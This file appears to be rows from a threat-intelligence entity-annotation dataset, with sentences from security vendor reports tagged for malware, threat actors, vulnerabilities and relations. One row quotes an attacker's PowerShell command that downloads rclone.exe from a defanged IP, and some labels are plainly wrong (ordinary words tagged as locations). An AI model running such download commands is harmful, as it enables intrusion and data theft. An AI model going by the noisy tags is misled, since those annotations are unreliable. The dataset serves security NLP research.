,index,text,entities,relations,Comments,id,label,start_offset,end_offset
5252,305,This allows the attacker to maintain control over the system even after the Citadel infection is removed.,"[{'id': 46004, 'label': 'malware', 'start_offset': 76, 'end_offset': 83}]",[],[],46004.0,malware,76.0,83.0
5253,12050,"On any given day, TAG is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries.",[],[],[],,,,
5254,740," Please mark, I'm not a robot!  By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.",[],[],[],,,,
5255,3666,"In our analysis of a related past campaign, we observed that attackers enter the system through spear phishing.","[{'id': 49450, 'label': 'attack-pattern', 'start_offset': 96, 'end_offset': 110}]",[],[],49450.0,attack-pattern,96.0,110.0
5256,3752,"Instead, they were either non-specific Mirai variants or contained previously known exploits such as CVE-2017-17215.","[{'id': 49581, 'label': 'malware', 'start_offset': 39, 'end_offset': 44}, {'id': 49580, 'label': 'vulnerability', 'start_offset': 101, 'end_offset': 115}]","[{'id': 834, 'from_id': 49581, 'to_id': 49580, 'type': 'exploits'}]",[],49581.0,malware,39.0,44.0
5257,417, The best way to understand the threat of unauthorized coin mining is to first understand its impact.,"[{'id': 46115, 'label': 'attack-pattern', 'start_offset': 42, 'end_offset': 66}]",[],[],46115.0,attack-pattern,42.0,66.0
5258,6123,Only three AV vendors correctly identified it as PlugX malware.,"[{'id': 18938, 'label': 'malware', 'start_offset': 49, 'end_offset': 54}]",[],[],18938.0,malware,49.0,54.0
5259,4958,Workspace administrators are also notified regarding targeted accounts in their domain.,[],[],[],,,,
5260,4156,"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -command ""$(new-object System.Net.WebClient).DownloadFile('http://195[.]123[.]221[.]7:8080/rclone.exe', 'r.exe')","[{'id': 49965, 'label': 'FILEPATH', 'start_offset': 0, 'end_offset': 57}, {'id': 49966, 'label': 'URL', 'start_offset': 117, 'end_offset': 159}]",[],[],49965.0,FILEPATH,0.0,57.0
5261,3329,An “ignore” list is used to filter the file extensions of URLs to avoid manipulating resources that are not JavaScript or HTML.,[],[],[],,,,
5262,11749,"Once the target agreed to the deal, a malware landing page disguised as a software download URL was sent via email or a PDF on Google Drive, and in a few cases, Google documents containing the phishing links.","[{'id': 36213, 'label': 'location', 'start_offset': 9, 'end_offset': 15}, {'id': 36214, 'label': 'location', 'start_offset': 30, 'end_offset': 34}, {'id': 36215, 'label': 'location', 'start_offset': 46, 'end_offset': 53}, {'id': 36216, 'label': 'location', 'start_offset': 54, 'end_offset': 58}, {'id': 36218, 'label': 'location', 'start_offset': 141, 'end_offset': 144}, {'id': 36220, 'label': 'attack-pattern', 'start_offset': 193, 'end_offset': 201}]",[],[],36213.0,location,9.0,15.0
5263,10730,"Based on the hardcoded version number they divulged (Version:1.15.11.26TB Mini), we were able to source other versions of the backdoor (listed in the appendix).","[{'id': 32793, 'label': 'attack-pattern', 'start_offset': 97, 'end_offset': 103}]",[],[],32793.0,attack-pattern,97.0,103.0
5264,3784,"Channel : #D getsome  7e29615126585b9f87ded09cfae4724bb5d7896c7daf2adfcef775924549e49b  099ac2f3e10346dbef472b2a7b443ebfe1f6011a9a2518a54c20aad07fe9ec61  Updated May 23, 2022, at 1 p.m. PT.   Sign up to receive the latest news, cyber threat intelligence and research from us  Please enter your email address!  Please mark, I'm not a robot!  By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.  ","[{'id': 11461, 'label': 'SHA2', 'start_offset': 88, 'end_offset': 152}, {'id': 11460, 'label': 'SHA2', 'start_offset': 22, 'end_offset': 86}, {'id': 49623, 'label': 'TIME', 'start_offset': 162, 'end_offset': 189}]",[],[],11461.0,SHA2,88.0,152.0
5265,11664,This fake DLL library decrypts the main backdoor + stealer from the .tmp file in the same directory.,"[{'id': 35789, 'label': 'location', 'start_offset': 14, 'end_offset': 21}, {'id': 35790, 'label': 'malware', 'start_offset': 51, 'end_offset': 58}, {'id': 35791, 'label': 'location', 'start_offset': 85, 'end_offset': 89}]",[],[],35789.0,location,14.0,21.0
5266,10123,"In the second half of 2017 Pawn Storm, an extremely active espionage actor group, didn’t shy away from continuing their brazen attacks.",[],[],[],,,,
5267,5489,We’re not sure how love wound up in the chat room or how he met hayat22.,"[{'id': 51489, 'label': 'identity', 'start_offset': 19, 'end_offset': 23}, {'id': 51490, 'label': 'identity', 'start_offset': 64, 'end_offset': 71}]",[],[],51489.0,identity,19.0,23.0
5268,6771,Opening document starts a template injection technique for loading the document template from the internet.,[],[],[],,,,
5269,3878,"These include Trend Micro endpoint solutions such as Trend Micro™ Smart Protection Suites and Worry-Free™ Business Security, which can protect users and businesses from these threats by detecting malicious files, well as blocking all related malicious URLs.","[{'id': 49731, 'label': 'identity', 'start_offset': 14, 'end_offset': 25}, {'id': 49732, 'label': 'identity', 'start_offset': 53, 'end_offset': 64}, {'id': 49733, 'label': 'SOFTWARE', 'start_offset': 66, 'end_offset': 89}, {'id': 49734, 'label': 'SOFTWARE', 'start_offset': 94, 'end_offset': 104}, {'id': 49735, 'label': 'SOFTWARE', 'start_offset': 106, 'end_offset': 123}]",[],[],49731.0,identity,14.0,25.0
5270,864," For readers that might be unfamiliar with ransomware, it’s a type of malware that is responsible for encrypting a user’s files with a key known only to the attackers.",[],[],[],,,,
5271,7596,Three files extracted from SFXRAR  Figure 11.,[],[],[],,,,
5272,34,"This has been true for over a decade, although the mechanisms available to criminals have shifted in that time.",[],[],[],,,,
5273,5221,"Our paper, “A Security Analysis of the Data Distribution Service (DDS) Protocol,” includes short- and long-term mitigation best practices and recommendations, as well as a consideration for adopting a shift-left approach.",[],[],[],,,,
5274,3890,"For mitigating and responding to an attack, organizations must practice good cyber hygiene by updating software, implementing an allow listing, and enabling strong spam filters.",[],[],[],,,,
5275,1360,"To determine how this vulnerability was exploited, we analyzed the patch that developers added to OctoberCMS version 1.0.472 to mitigate the CVE-2021-32648 vulnerability.","[{'id': 46690, 'label': 'vulnerability', 'start_offset': 141, 'end_offset': 155}, {'id': 46692, 'label': 'SOFTWARE', 'start_offset': 98, 'end_offset': 108}]","[{'id': 212, 'from_id': 46692, 'to_id': 46690, 'type': 'has'}]",[],46690.0,vulnerability,141.0,155.0
5276,6757," In March, we came across an email with a malware attachment that used the Gamaredon group’s tactics.",[],[],[],,,,
5277,13193,"Based on the malware version number, this backdoor’s first version was developed in or before 2011.",[],[],[],,,,
5278,2749, Vulnerability Details  CVE-2014-6271 exists in all versions of Bash and is related to how environment variables are processed when the shell starts up.,"[{'id': 47993, 'label': 'vulnerability', 'start_offset': 24, 'end_offset': 37}, {'id': 47994, 'label': 'tools', 'start_offset': 64, 'end_offset': 68}]","[{'id': 369, 'from_id': 47994, 'to_id': 47993, 'type': 'has'}]",[],47993.0,vulnerability,24.0,37.0
5279,12541,"The exploit chain combined an RCE in WebKit exploiting CVE-2021-1789 which was patched on Jan 5, 2021 before discovery of this campaign and a 0-day local privilege escalation in XNU (CVE-2021-30869) patched on Sept 23, 2021.","[{'id': 39026, 'label': 'location', 'start_offset': 64, 'end_offset': 68}, {'id': 39028, 'label': 'location', 'start_offset': 127, 'end_offset': 135}, {'id': 39029, 'label': 'location', 'start_offset': 136, 'end_offset': 139}, {'id': 39031, 'label': 'attack-pattern', 'start_offset': 154, 'end_offset': 174}]",[],[],39026.0,location,64.0,68.0
5280,5885,"Yeah, sure, absolutely.",[],[],[],,,,
5281,1686,While investigating Reaver we recently also discovered a new variant of the SunOrcal malware family.,"[{'id': 45095, 'label': 'malware', 'start_offset': 20, 'end_offset': 26}, {'id': 5004, 'label': 'malware', 'start_offset': 76, 'end_offset': 84}]",[],[],45095.0,malware,20.0,26.0
5282,4463,NSO Group continues to pose risks across the Internet ecosystem.,"[{'id': 50247, 'label': 'threat-actor', 'start_offset': 0, 'end_offset': 9}]",[],[],50247.0,threat-actor,0.0,9.0
5283,1125, Only the first of the examples had the mutex associated with a vast majority of malware samples.,[],[],[],,,,
5284,3330,The script then modifies the original JavaScript or HTML content and delivers it to website visitors.,[],[],[],,,,
5285,13373,"Like previous websites we’ve seen set up by this actor, this website has a link to their PGP public key at the bottom of the page.","[{'id': 41617, 'label': 'location', 'start_offset': 93, 'end_offset': 99}, {'id': 41618, 'label': 'tools', 'start_offset': 125, 'end_offset': 129}]",[],[],41617.0,location,93.0,99.0
5286,5385,These compromised devices periodically connect to C&C servers that are themselves hosted on compromised WatchGuard devices.,[],[],[],,,,
5287,3447, Table 1 shows the commands that would be executed in the event of successful exploitation.,[],[],[],,,,
5288,2174, Cortex XDR Agent 7.5 and higher (with content version 540-92526) prevents attempts to exploit this vulnerability with the Behavioral Threat Protection module.,"[{'id': 47310, 'label': 'SOFTWARE', 'start_offset': 1, 'end_offset': 21}]",[],[],47310.0,SOFTWARE,1.0,21.0
5289,1517," If the file does not receive any data within 30 seconds it will send a ""xy"" response back to the server.",[],[],[],,,,
5290,13135,"They often contain hundreds of queries to process, which may have been written by lawyers who don’t fully understand the subject matter.",[],[],[],,,,
5291,11820,Android App: https://www.virustotal.com/gui/file/5d3ff202f20af915863eee45916412a271bae1ea3a0e20988309c16723ce4da5/detection  Android App C2: communication-shield[.]site cdsa[.]xyz,[],[],[],,,,
5292,9068,An attacker mining Ant Share Defending against RATANKBA,"[{'id': 28000, 'label': 'malware', 'start_offset': 47, 'end_offset': 55}]",[],[],28000.0,malware,47.0,55.0
5293,914," It’s also interesting to note that each time PClock2 scans a directory or encrypts a file, it makes an HTTP POST request to the C2 server.","[{'id': 46436, 'label': 'Infrastucture', 'start_offset': 129, 'end_offset': 138}, {'id': 46435, 'label': 'malware', 'start_offset': 46, 'end_offset': 53}]","[{'id': 189, 'from_id': 46435, 'to_id': 46436, 'type': 'beacons-to'}]",[],46436.0,Infrastucture,129.0,138.0
5294,2045," Unfortunately, this specific string is not completely unique to x4k, and is instead found on several GitHub repositories as part of a technique to allow a running executable to delete itself from disk through renaming primary data streams within the file to :wtfbbq.","[{'id': 47135, 'label': 'threat-actor', 'start_offset': 65, 'end_offset': 68}, {'id': 47136, 'label': 'SOFTWARE', 'start_offset': 102, 'end_offset': 108}]",[],[],47135.0,threat-actor,65.0,68.0
5295,3541,A list of indicators of compromise (IoCs) related to Blackgear is in this appendix.,"[{'id': 49317, 'label': 'threat-actor', 'start_offset': 53, 'end_offset': 62}]",[],[],49317.0,threat-actor,53.0,62.0
5296,6691,"On any given day, Google's Threat Analysis Group (TAG) is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries.",[],[],[],,,,
5297,8308,"Like much of their tooling, HYPERSCRAPE is not notable for its technical sophistication, but rather its effectiveness in accomplishing Charming Kitten’s objectives.","[{'id': 25618, 'label': 'location', 'start_offset': 5, 'end_offset': 9}, {'id': 25620, 'label': 'threat-actor', 'start_offset': 135, 'end_offset': 150}]",[],[],25618.0,location,5.0,9.0
5298,14237,Following Winnti's Trails The GitHub account used by the threat actor was created in May 2016.,"[{'id': 48426, 'label': 'identity', 'start_offset': 10, 'end_offset': 16}, {'id': 48428, 'label': 'TIME', 'start_offset': 89, 'end_offset': 93}, {'id': 48427, 'label': 'SOFTWARE', 'start_offset': 30, 'end_offset': 37}]",[],[],48426.0,identity,10.0,16.0
5299,628,Windows users should take the following general steps to protect themselves:,"[{'id': 46217, 'label': 'SOFTWARE', 'start_offset': 0, 'end_offset': 7}]",[],[],46217.0,SOFTWARE,0.0,7.0
5300,4706,We use our research to continuously improve the safety and security of our products and share this intelligence with our industry peers.,[],[],[],,,,
5301,13776,The decryption-execution-encryption flow in the shellcode execution routine  Figure 5.,[],[],[],,,,
5302,7745,Figure 15.,[],[],[],,,,
5303,5585,StealthWorker,[],[],[],,,,
5304,5180,New vulnerabilities,[],[],[],,,,
5305,11036,"If you have communicated with any of these accounts or visited the actors’ blog, we suggest you review your systems for the IOCs provided below.",[],[],[],,,,
5306,3484,"The format used by Protux’s latest version is now similar to Marade’s, as shown in Figure 6.","[{'id': 10580, 'label': 'malware', 'start_offset': 19, 'end_offset': 25}, {'id': 49291, 'label': 'malware', 'start_offset': 61, 'end_offset': 67}]",[],[],10580.0,malware,19.0,25.0
5307,8303,We have seen it deployed against fewer than two dozen accounts located in Iran.,[],[],[],,,,
5308,587,"Please mark, I'm not a robot!  ",[],[],[],,,,
5309,4725,We assessed that a surveillance vendor packaged and sold these technologies.,[],[],[],,,,
5310,2026,"The second sample, on the other hand, is far more obfuscated, and is executed in memory by a packer rather than a full-scale loader.",[],[],[],,,,
5311,3093, Vulnerabilities  These vulnerabilities present a unique situation because they ultimately are hardware-based vulnerabilities.,[],[],[],,,,
5312,2138,"Palo Alto Networks customers who have deployed vulnerability signatures in content release version 8057 released on August 24, 2018, which include ID 33948 Name: Apache Struts 2 Remote Code Execution Vulnerability, are protected against currently known exploits against that vulnerability.","[{'id': 47271, 'label': 'TIME', 'start_offset': 116, 'end_offset': 131}, {'id': 47270, 'label': 'identity', 'start_offset': 0, 'end_offset': 18}, {'id': 47272, 'label': 'SOFTWARE', 'start_offset': 162, 'end_offset': 177}, {'id': 47273, 'label': 'vulnerability', 'start_offset': 178, 'end_offset': 213}]",[],[],47271.0,TIME,116.0,131.0
5313,4978,"We've seen this technique used against journalists and other unidentified targets, and alerted those users when possible.",[],[],[],,,,
5314,5017,"Here is a deeper look at the campaign activity TAG has observed and the actions the team has taken to protect our users over the past few weeks: APT28 or Fancy Bear, a threat actor attributed to Russia GRU, was observed targeting users in Ukraine with a new variant of malware.","[{'id': 51078, 'label': 'location', 'start_offset': 239, 'end_offset': 246}, {'id': 51074, 'label': 'identity', 'start_offset': 47, 'end_offset': 50}, {'id': 51075, 'label': 'threat-actor', 'start_offset': 145, 'end_offset': 150}, {'id': 51076, 'label': 'threat-actor', 'start_offset': 154, 'end_offset': 164}, {'id': 51077, 'label': 'identity', 'start_offset': 195, 'end_offset': 205}]","[{'id': 1035, 'from_id': 51076, 'to_id': 51075, 'type': 'duplicate-of'}, {'id': 1036, 'from_id': 51075, 'to_id': 51077, 'type': 'attributed-to'}, {'id': 1037, 'from_id': 51075, 'to_id': 51078, 'type': 'targets'}]",[],51078.0,location,239.0,246.0
5315,609,Figure 2: Hancitor malspam example from February 2017.,"[{'id': 44797, 'label': 'malware', 'start_offset': 10, 'end_offset': 18}, {'id': 44798, 'label': 'TIME', 'start_offset': 40, 'end_offset': 53}]",[],[],44797.0,malware,10.0,18.0
5316,1456,The distribution of the number of apps sharing the same key is shown below.,[],[],[],,,,
5317,4419,"private bool IsThereAnyEMail() { List < GeckoHtmlElement > list = (from x in this.geckoWebBrowser.Document.GetElementsByTagName(""span"") where x.TextContent.StartsWith (""Security alert"") || x.TextContent.StartsWith(""Archive of Google data requested"") || x.TextContent.StartsWith(""Your Google data archive is ready"") || x.TextContent.StartsWith(""Your Google data is ready"") || x.TextContent.StartsWith(""Critical security alert"") ||",[],[],[],,,,
5318,842,"Typically, attacks against the kernel are used in conjunction with code execution attacks so that an attacker can target a limited privilege user but ultimately gain full control over the system.",[],[],[],,,,
5319,5198,"Meanwhile, the vulnerabilities we found on the configuration attack surface can be abused to affect the DDS developer or system integrator, potentially compromising the integrity of the software supply chain.",[],[],[],,,,
5320,3056, Figure 1 AntiVirus for Android™ in the Google Play Store  ,"[{'id': 48136, 'label': 'malware', 'start_offset': 10, 'end_offset': 32}, {'id': 48137, 'label': 'SOFTWARE', 'start_offset': 40, 'end_offset': 57}]",[],[],48136.0,malware,10.0,32.0
5321,3331,        Figure 27.,[],[],[],,,,
5322,3094,All three stem from issues in modern processors and are known to affect Intel and ARM chips.,[],[],[],,,,
5323,11429,"While vulnerability research is an important contributor to online safety when that research is used to improve the security of products, vendors stockpiling zero-day vulnerabilities in secret can pose a severe risk to the Internet when the vendor itself gets compromised.","[{'id': 34906, 'label': 'tools', 'start_offset': 67, 'end_offset': 73}, {'id': 34907, 'label': 'location', 'start_offset': 116, 'end_offset': 124}, {'id': 34909, 'label': 'location', 'start_offset': 193, 'end_offset': 196}, {'id': 34910, 'label': 'location', 'start_offset': 241, 'end_offset': 247}]",[],[],34906.0,tools,67.0,73.0
5324,3901,"Ransomware incidents are federal crimes, according to the agency.",[],[],[],,,,
5325,3960,"·        C:\Program Files\Trend Micro\ ams p.dat ·        C:\Oracle\Oracle.dat ·        C:\Program Files\McAfee\MacAfee.dat These suspicious activities were seen via our XDR solution, which helped us monitor observable attack techniques and provided critical security alerts including anomalous file extension execution, remote execution via system tools, web shell-related activities, and potential exploit attacks.","[{'id': 49817, 'label': 'FILEPATH', 'start_offset': 9, 'end_offset': 48}, {'id': 49818, 'label': 'FILEPATH', 'start_offset': 58, 'end_offset': 78}, {'id': 49819, 'label': 'FILEPATH', 'start_offset': 88, 'end_offset': 124}]",[],[],49817.0,FILEPATH,9.0,48.0
5326,7333, Description  Defense Evasion,[],[],[],,,,
5327,7472,Some documents also come with government emblems.,[],[],[],,,,
5328,12958,"We recovered the exploit used to escape the Chrome Sandbox, but not the initial RCE exploit.",[],[],[],,,,
5329,962,Registered receiver for SMS_RECEIVED  The registered receiver Rf2b reads SMS messages whenever they arrive.,[],[],[],,,,
5330,14393,Pulling together deep security information from across your enterprise is what is needed to face off against such advanced and intentionally evasive attacks.,[],[],[],,,,
5331,1573,Once inside a network it spreads by harvesting credentials with the Mimikatz tool as well as using hard coded credentials.,"[{'id': 46829, 'label': 'tools', 'start_offset': 68, 'end_offset': 76}, {'id': 46830, 'label': 'attack-pattern', 'start_offset': 36, 'end_offset': 58}, {'id': 46831, 'label': 'attack-pattern', 'start_offset': 99, 'end_offset': 121}]",[],[],46829.0,tools,68.0,76.0
5332,5370, The writing is done by the j_save_data() function.,[],[],[],,,,
5333,8537,Open source malware like Sorano and AdamantiumThief were also observed.,"[{'id': 26383, 'label': 'attack-pattern', 'start_offset': 5, 'end_offset': 11}, {'id': 26385, 'label': 'location', 'start_offset': 32, 'end_offset': 35}]",[],[],26383.0,attack-pattern,5.0,11.0
5334,3754,The exploits involving Enemybot eventually download Enemybot samples that themselves embed CVE-2022-22954 exploits for further exploitation and propagation.,"[{'id': 11380, 'label': 'malware', 'start_offset': 23, 'end_offset': 31}, {'id': 49586, 'label': 'vulnerability', 'start_offset': 91, 'end_offset': 105}, {'id': 49585, 'label': 'malware', 'start_offset': 52, 'end_offset': 60}]","[{'id': 837, 'from_id': 49585, 'to_id': 49586, 'type': 'exploits'}, {'id': 838, 'from_id': 11380, 'to_id': 49585, 'type': 'downloads'}]",[],11380.0,malware,23.0,31.0
5335,809,"You and your employees can also use password managers to make unique, complex passwords for each site not just a goal but a reality.",[],[],[],,,,
5336,3011,"Also, many gaming platforms now include a second means of authentication (typically a text sent to your phone): you can and should enable that, if at all possible.",[],[],[],,,,
5337,9590,A log file is written containing a count of the emails that were downloaded.,[],[],[],,,,
5338,11063,We received leads from the FBI that supported us in this investigation.,[],[],[],,,,
5339,3278,"Next, it starts the FFmpeg process to monitor the victim’s desktop via RTMP live streaming to the cloud.","[{'id': 48376, 'label': 'SOFTWARE', 'start_offset': 20, 'end_offset': 26}]",[],[],48376.0,SOFTWARE,20.0,26.0
5340,4688,catch (Exception) { bool hasExited = process.HasExited; if (hasExited) { flag = true; } },[],[],[],,,,
5341,1174, senna spy rock in rio 2001 virus - Subtlety.,"[{'id': 46580, 'label': 'malware', 'start_offset': 1, 'end_offset': 27}]",[],[],46580.0,malware,1.0,27.0
5342,10698,Cyber attackers could compromise software components of third-party suppliers by inserting malicious code inconspicuously.,[],[],[],,,,
5343,3092," At the time of this writing, there are no known active attacks against any of these vulnerabilities.",[],[],[],,,,
5344,4726,"Reporting by CitizenLab linked this activity to Candiru, an Israeli spyware vendor.","[{'id': 50628, 'label': 'identity', 'start_offset': 13, 'end_offset': 23}, {'id': 50629, 'label': 'threat-actor', 'start_offset': 48, 'end_offset': 55}, {'id': 50630, 'label': 'identity', 'start_offset': 60, 'end_offset': 82}]",[],[],50628.0,identity,13.0,23.0
5345,11833,"Since mid-August, OpenSUpdater samples have carried an invalid signature, and further investigation showed this was a deliberate attempt to evade detection.","[{'id': 36498, 'label': 'malware', 'start_offset': 18, 'end_offset': 30}, {'id': 36499, 'label': 'location', 'start_offset': 74, 'end_offset': 77}]",[],[],36498.0,malware,18.0,30.0
5346,1958,"The Trend Micro™ Deep Discovery™ threat protection platform enables organizations to detect, analyze, and respond to modern threats such as sophisticated malware, targeted attacks, and APTs.","[{'id': 47082, 'label': 'SOFTWARE', 'start_offset': 4, 'end_offset': 32}]",[],[],47082.0,SOFTWARE,4.0,32.0
5347,8940,      Figure 4. Malicious Javascript code inserted into 2.2.0.exe targeting Windows OS      Figure 5.,[],[],[],,,,
5348,112,"As you see in the image above, most cloud attacks are going to fall into one of these areas.",[],[],[],,,,
5349,1295,This file is used to store a key that is later used to decrypt data received during network communications.,[],[],[],,,,
5350,12007,"In collaboration with YouTube, Gmail, Trust & Safety, CyberCrime Investigation Group and Safe Browsing teams, our protections have decreased the volume of related phishing emails on Gmail by 99.6% since May 2021.","[{'id': 37138, 'label': 'location', 'start_offset': 85, 'end_offset': 88}, {'id': 37140, 'label': 'attack-pattern', 'start_offset': 163, 'end_offset': 171}]",[],[],37138.0,location,85.0,88.0
5351,1012,A seller advertises how an MIT account can be used to access online library resources.,"[{'id': 46512, 'label': 'identity', 'start_offset': 27, 'end_offset': 30}]",[],[],46512.0,identity,27.0,30.0
5352,5112,This isn't to blame of the general public.,[],[],[],,,,
5353,1639,", Whois data indicates it was also used to register the domain hosting the Funtasy Mobile premium SMS service.","[{'id': 46862, 'label': 'malware', 'start_offset': 75, 'end_offset': 82}]",[],[],46862.0,malware,75.0,82.0
5354,11635,"    Tags  Cloud | Malware | Cyber Crime | Exploits & Vulnerabilities | Phishing | Deep Web | Cyber Threats | APT & Targeted Attacks | Compliance & Risks | Articles, News, Reports | Security Strategies","[{'id': 35698, 'label': 'location', 'start_offset': 10, 'end_offset': 15}, {'id': 35699, 'label': 'attack-pattern', 'start_offset': 71, 'end_offset': 79}, {'id': 35700, 'label': 'location', 'start_offset': 109, 'end_offset': 112}, {'id': 35701, 'label': 'location', 'start_offset': 181, 'end_offset': 189}]",[],[],35698.0,location,10.0,15.0
5355,271,We’ve updated and added signatures to the WildFire analysis and Cortex XDR Prevent and Pro products to block newly discovered vulnerabilities and malware including HermeticWiper.,"[{'id': 45961, 'label': 'SOFTWARE', 'start_offset': 42, 'end_offset': 50}, {'id': 45960, 'label': 'malware', 'start_offset': 164, 'end_offset': 177}, {'id': 45962, 'label': 'SOFTWARE', 'start_offset': 64, 'end_offset': 90}]",[],[],45961.0,SOFTWARE,42.0,50.0
5356,5205,"BAF Percentage of Attack Duration (Total experiment duration = 139s)  CVE-2021-38425 Fast-DDS, ROS 2 master branch 9.875 100.0 CVE-2021-38429 OpenDDS, ROS 2 >= 3.18.1 18.68 24.17 CVE-2021-38487","[{'id': 51251, 'label': 'vulnerability', 'start_offset': 70, 'end_offset': 84}, {'id': 51252, 'label': 'vulnerability', 'start_offset': 127, 'end_offset': 141}, {'id': 51253, 'label': 'vulnerability', 'start_offset': 179, 'end_offset': 193}]",[],[],51251.0,vulnerability,70.0,84.0
5357,911,It should be noted that PClock takes a very long time to encrypt these files.,"[{'id': 46433, 'label': 'malware', 'start_offset': 24, 'end_offset': 30}]",[],[],46433.0,malware,24.0,30.0
5358,13020,TAG has also continued to observe multiple ransomware brokers continuing to operate in a business as usual sense.,"[{'id': 48838, 'label': 'identity', 'start_offset': 0, 'end_offset': 4}]",[],[],48838.0,identity,0.0,4.0
5359,8556,"On any given day, TAG is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries.",[],[],[],,,,
5360,1076,"However, most people who run Android run versions that are vulnerable.","[{'id': 46559, 'label': 'SOFTWARE', 'start_offset': 29, 'end_offset': 36}]",[],[],46559.0,SOFTWARE,29.0,36.0
5361,2697,CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.,"[{'id': 45663, 'label': 'identity', 'start_offset': 0, 'end_offset': 11}]",[],[],45663.0,identity,0.0,11.0
5362,2971,"But even for devices that don’t, you can and should use a password manager to generate and store strong passwords for use on all devices in its vault.",[],[],[],,,,
5363,14229,Any malware threat analyst will immediately recognize Line 3 in the image above as a potential PlugX-encrypted line.,[],[],[],,,,
5364,13497,"Although Void Balaur offers a wide range of services, the group’s bread and butter is cyberespionage and information theft, selling highly sensitive information on individuals in underground forums and websites such as Probiv.","[{'id': 51565, 'label': 'threat-actor', 'start_offset': 9, 'end_offset': 20}]",[],[],51565.0,threat-actor,9.0,20.0
5365,7510,"The backdoor first finds out the machine IP address by querying the internet service api[.]ipify[.]org, which returns the IP address of the currently infected machine.",[],[],[],,,,
5366,5982,"Recently observed COLDRIVER credential phishing domains: Ghostwriter, a Belarusian threat actor, has remained active during the course of the war and recently resumed targeting of Gmail accounts via credential phishing.","[{'id': 18406, 'label': 'threat-actor', 'start_offset': 18, 'end_offset': 27}, {'id': 18407, 'label': 'attack-pattern', 'start_offset': 39, 'end_offset': 47}, {'id': 18408, 'label': 'tools', 'start_offset': 57, 'end_offset': 68}, {'id': 18410, 'label': 'location', 'start_offset': 142, 'end_offset': 145}, {'id': 18411, 'label': 'location', 'start_offset': 146, 'end_offset': 149}, {'id': 18413, 'label': 'attack-pattern', 'start_offset': 210, 'end_offset': 218}]",[],[],18406.0,threat-actor,18.0,27.0
5367,1342,"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.",[],[],[],,,,
5368,460,Attackers do this because security software and vendors act quickly to block and take down malicious domains that malware uses.,[],[],[],,,,
5369,14125,That user was doing manual activities the majority of the time.,[],[],[],,,,
5370,6953,"Initial spear-phishing document with a link to another malicious document     Once the victim clicks the link, it will download a document laced with a malicious macro.","[{'id': 21767, 'label': 'location', 'start_offset': 8, 'end_offset': 13}, {'id': 21768, 'label': 'attack-pattern', 'start_offset': 14, 'end_offset': 22}, {'id': 21769, 'label': 'location', 'start_offset': 114, 'end_offset': 118}]",[],[],21767.0,location,8.0,13.0
5371,761,"In this new patch, every time Internet Explorer tries to free an object, it is not freed immediately.","[{'id': 46346, 'label': 'SOFTWARE', 'start_offset': 30, 'end_offset': 47}]",[],[],46346.0,SOFTWARE,30.0,47.0
5372,8896,"Chances are, the normal file that loads the rest of PlugX uses a file name that is different from what it normally uses or is in a location where it is not usually found.","[{'id': 27506, 'label': 'location', 'start_offset': 8, 'end_offset': 11}, {'id': 27507, 'label': 'location', 'start_offset': 17, 'end_offset': 23}, {'id': 27508, 'label': 'malware', 'start_offset': 52, 'end_offset': 57}]",[],[],27506.0,location,8.0,11.0
5373,1103,"Note that while the technical implementation may not expose said functionality as a normal library, such exposure is not necessary for the types of analysis performed here.",[],[],[],,,,
5374,13782, Figure 7.,[],[],[],,,,
5375,2201,"The video player is written to one of the following locations, based on the original filename:  The malware itself is written to the %TEMP% directory as well.","[{'id': 47316, 'label': 'FILEPATH', 'start_offset': 133, 'end_offset': 139}]",[],[],47316.0,FILEPATH,133.0,139.0
5376,1577, Reconnaissance  This attack does not appear to be targeted.,[],[],[],,,,
5377,11653,An example of a downloaded ZIP file containing an LNK file that is used to download a malicious HTA file,[],[],[],,,,
